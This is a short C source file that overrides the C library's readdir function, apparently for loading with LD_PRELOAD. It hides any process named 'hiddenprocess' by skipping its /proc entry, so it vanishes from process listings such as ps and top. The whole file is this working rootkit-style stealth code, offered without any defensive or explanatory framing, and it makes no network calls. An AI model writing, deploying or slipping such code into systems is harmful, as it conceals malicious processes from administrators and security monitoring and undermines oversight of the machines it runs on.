#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

static struct dirent *(*real_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp)
{
    if (real_readdir == NULL)
    {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL)
    {
        if (entry->d_type == DT_DIR)
        {
            char *end;
            strtol(entry->d_name, &end, 10);
            if (end != entry->d_name && *end == '\0')
            {
                char path[256];
                snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
                FILE *f = fopen(path, "r");
                if (f)
                {
                    char name[100];
                    if (fgets(name, sizeof(name), f))
                    {
                        // Remove newline
                        char *nl = strchr(name, '\n');
                        if (nl)
                            *nl = '\0';
                        if (strcmp(name, "hiddenprocess") == 0)
                        {
                            fclose(f);
                            continue; 
                        }
                    }
                    fclose(f);
                }
            }
        }
        return entry;
    }
    return NULL;
}